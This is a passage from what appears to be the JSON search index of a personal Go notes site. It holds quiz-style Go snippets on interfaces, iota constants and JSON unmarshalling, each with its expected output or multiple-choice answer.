Speak has pointer receiver)\n\u003c/code\u003e\u003c/pre\u003e\u003c/details\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003einterface2\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003epackage\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;fmt\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003etype\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eT1\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003estruct\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003eString\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e() \u003cspan style=\"color:#66d9ef\"\u003estring\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e (\u003cspan style=\"color:#a6e22e\"\u003eT1\u003c/span\u003e) \u003cspan style=\"color:#a6e22e\"\u003eError\u003c/span\u003e() \u003cspan style=\"color:#66d9ef\"\u003estring\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;T1.Error\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003etype\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eT2\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003estruct\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003eError\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e() \u003cspan style=\"color:#66d9ef\"\u003estring\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e (\u003cspan style=\"color:#a6e22e\"\u003eT2\u003c/span\u003e) \u003cspan style=\"color:#a6e22e\"\u003eString\u003c/span\u003e() \u003cspan style=\"color:#66d9ef\"\u003estring\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;T2.String\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003evar\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003et1\u003c/span\u003e = \u003cspan style=\"color:#a6e22e\"\u003eT1\u003c/span\u003e{\u003cspan style=\"color:#a6e22e\"\u003eString\u003c/span\u003e: \u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e() \u003cspan style=\"color:#66d9ef\"\u003estring\u003c/span\u003e { \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;T1.String\u0026#34;\u003c/span\u003e }}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003evar\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003et2\u003c/span\u003e = \u003cspan style=\"color:#a6e22e\"\u003eT2\u003c/span\u003e{\u003cspan style=\"color:#a6e22e\"\u003eError\u003c/span\u003e: \u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e() \u003cspan style=\"color:#66d9ef\"\u003estring\u003c/span\u003e { \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;T2.Error\u0026#34;\u003c/span\u003e }}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003et1\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eError\u003c/span\u003e(), \u003cspan style=\"color:#a6e22e\"\u003et1\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eString\u003c/span\u003e())\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003et2\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eError\u003c/span\u003e(), \u003cspan style=\"color:#a6e22e\"\u003et2\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eString\u003c/span\u003e())\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003et1\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003et2\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdetails\u003e\n\u003csummary\u003eAnswer\u003c/summary\u003e\n\u003cpre\u003e\u003ca href=\"https://go.dev/play/p/IzeaCg4N47K\" target=\"_blank\"\u003eTry it\u003c/a\u003e\n\u003ccode class=\"language-shell\"\u003eT1.Error T1.String\nT2.Error T2.String\nT1.Error T2.String\n\u003c/code\u003e\u003c/pre\u003e\u003c/details\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003einterface3\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003epackage\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;fmt\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003evar\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ep\u003c/span\u003e [\u003cspan style=\"color:#ae81ff\"\u003e100\u003c/span\u003e]\u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003evar\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003em\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003einterface\u003c/span\u003e{} = [\u003cspan style=\"color:#f92672\"\u003e...\u003c/span\u003e]\u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e{\u003cspan style=\"color:#ae81ff\"\u003e99\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ep\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003em\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdetails\u003e\n\u003csummary\u003eAnswer\u003c/summary\u003e\n\u003cpre\u003e\u003ca href=\"https://go.dev/play/p/k5eQBOljQLH\" target=\"_blank\"\u003eTry it\u003c/a\u003e\n\u003ccode class=\"language-shell\"\u003etrue\n\u003c/code\u003e\u003c/pre\u003e\u003c/details\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e","tags":null,"title":"Interface"},{"categories":null,"contents":" iota package main import \u0026#34;fmt\u0026#34; const ( x = iota _ y z = \u0026#34;zz\u0026#34; k p = iota ) func main() { fmt.Println(x, y, z, k, p) } Answer Try it 0 2 zz zz 5 iota1 package main import \u0026#34;fmt\u0026#34; const ( a = iota b = iota ) const ( name = \u0026#34;name\u0026#34; c = iota d = iota ) func main() { fmt.Println(a, b, c, d) } Answer Try it 0 1 1 2 ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/notes/go/questions/iota/","summary":"\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eiota\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003epackage\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;fmt\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003econst\u003c/span\u003e (\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003ex\u003c/span\u003e = \u003cspan style=\"color:#66d9ef\"\u003eiota\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003e_\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003ey\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003ez\u003c/span\u003e = \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;zz\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003ek\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003ep\u003c/span\u003e = \u003cspan style=\"color:#66d9ef\"\u003eiota\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ex\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003ey\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003ez\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003ek\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003ep\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdetails\u003e\n\u003csummary\u003eAnswer\u003c/summary\u003e\n\u003cpre\u003e\u003ca href=\"https://go.dev/play/p/ujsBSQPBkm8\" target=\"_blank\"\u003eTry it\u003c/a\u003e\n\u003ccode class=\"language-shell\"\u003e0 2 zz zz 5\n\u003c/code\u003e\u003c/pre\u003e\u003c/details\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eiota1\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003epackage\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;fmt\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003econst\u003c/span\u003e (\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003ea\u003c/span\u003e = \u003cspan style=\"color:#66d9ef\"\u003eiota\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003eb\u003c/span\u003e = \u003cspan style=\"color:#66d9ef\"\u003eiota\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003econst\u003c/span\u003e (\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003ename\u003c/span\u003e = \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;name\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003ec\u003c/span\u003e    = \u003cspan style=\"color:#66d9ef\"\u003eiota\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003ed\u003c/span\u003e    = \u003cspan style=\"color:#66d9ef\"\u003eiota\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ea\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eb\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003ec\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003ed\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdetails\u003e\n\u003csummary\u003eAnswer\u003c/summary\u003e\n\u003cpre\u003e\u003ca href=\"https://go.dev/play/p/9OvlzxqBZa5\" target=\"_blank\"\u003eTry it\u003c/a\u003e\n\u003ccode class=\"language-shell\"\u003e0 1 1 2\n\u003c/code\u003e\u003c/pre\u003e\u003c/details\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e","tags":null,"title":"Iota"},{"categories":null,"contents":" json package main import ( \u0026#34;encoding/json\u0026#34; \u0026#34;fmt\u0026#34; ) type AutoGenerated struct { Age int `json:\u0026#34;age\u0026#34;` Name string `json:\u0026#34;name\u0026#34;` Child []int `json:\u0026#34;child\u0026#34;` } func main() { jsonStr1 := `{\u0026#34;age\u0026#34;: 14,\u0026#34;name\u0026#34;: \u0026#34;potter\u0026#34;, \u0026#34;child\u0026#34;:[1,2,3]}` a := AutoGenerated{} json.Unmarshal([]byte(jsonStr1), \u0026amp;a) aa := a.Child fmt.Println(aa) jsonStr2 := `{\u0026#34;age\u0026#34;: 12,\u0026#34;name\u0026#34;: \u0026#34;potter\u0026#34;, \u0026#34;child\u0026#34;:[3,4,5,7,8,9]}` json.Unmarshal([]byte(jsonStr2), \u0026amp;a) fmt.Println(aa) } A. [1 2 3] [1 2 3] B. [1 2 3] [3 4 5] C. [1 2 3] [3 4 5 6 7 8 9] D. [1 2 3] [3 4 5 0 0 0] Answer Try it B json1 package main import ( \u0026#34;encoding/json\u0026#34; \u0026#34;fmt\u0026#34; \u0026#34;time\u0026#34; ) func main() { t := struct { time.Time N int }{ time.Date(2020, 12, 20, 0, 0, 0, 0, time.UTC), 5, } m, _ := json.Marshal(t) fmt.Printf(\u0026#34;%s\u0026#34;, m) } A. {\u0026ldquo;Time\u0026rdquo;:\u0026ldquo;2020-12-20T00:00:00Z\u0026rdquo;,\u0026ldquo;N\u0026rdquo;:5} B. \u0026ldquo;2020-12-20T00:00:00Z\u0026rdquo; C. {\u0026ldquo;N\u0026rdquo;:5} D. \u0026lt;nil\u0026gt; E. else Answer Try it B ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/notes/go/questions/json/","summary":"\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003ejson\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003epackage\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e (\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;encoding/json\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;fmt\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003etype\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eAutoGenerated\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003estruct\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003eAge\u003c/span\u003e   \u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e    \u003cspan style=\"color:#e6db74\"\u003e`json:\u0026#34;age\u0026#34;`\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003eName\u003c/span\u003e  \u003cspan style=\"color:#66d9ef\"\u003estring\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e`json:\u0026#34;name\u0026#34;`\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003eChild\u003c/span\u003e []\u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e  \u003cspan style=\"color:#e6db74\"\u003e`json:\u0026#34;child\u0026#34;`\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003ejsonStr1\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e`{\u0026#34;age\u0026#34;: 14,\u0026#34;name\u0026#34;: \u0026#34;potter\u0026#34;, \u0026#34;child\u0026#34;:[1,2,3]}`\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003ea\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eAutoGenerated\u003c/span\u003e{}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003ejson\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eUnmarshal\u003c/span\u003e([]byte(\u003cspan style=\"color:#a6e22e\"\u003ejsonStr1\u003c/span\u003e), \u003cspan style=\"color:#f92672\"\u003e\u0026amp;\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003ea\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003eaa\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ea\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eChild\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003eaa\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan 